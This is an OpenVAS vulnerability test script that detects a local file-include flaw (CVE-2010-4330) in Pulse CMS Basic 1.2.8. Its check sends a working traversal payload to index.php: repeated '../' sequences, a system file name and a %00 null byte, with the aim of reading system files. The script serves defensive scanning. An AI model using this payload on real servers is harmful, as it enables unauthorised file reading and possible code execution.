###############################################################################
# OpenVAS Vulnerability Test
#
# Pulse CMS Basic Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100935");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2010-12-06 15:55:47 +0100 (Mon, 06 Dec 2010)");
  script_bugtraq_id(45186);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-4330");

  script_name("Pulse CMS Basic Local File Include Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45186");
  script_xref(name:"URL", value:"http://pulsecms.com/");
  script_xref(name:"URL", value:"http://www.uncompiled.com/2010/12/pulse-cms-basic-local-file-inclusion-vulnerability-cve-2010-4330/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Reportedly, the issue is fixed in version 1.2.9, but Symantec has not
  confirmed this. Please contact the vendor for more information.");

  script_tag(name:"summary", value:"Pulse CMS Basic is prone to a local file-include vulnerability.

  An attacker can exploit this issue to include arbitrary local files
  and execute PHP code on the affected computer in the context of the
  webserver process. This may facilitate a compromise of the application
  and the underlying system, other attacks are also possible.

  Pulse CMS Basic 1.2.8 is vulnerable, other versions may also be
  affected.");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/cms", "/pulse", "/pulsecms", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file (keys(files)) {

    url = string(dir,"/index.php??p=",crap(data:"../",length:3*9),files[file],"%00");

    if(http_vuln_check(port:port, url:url,pattern:file)) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
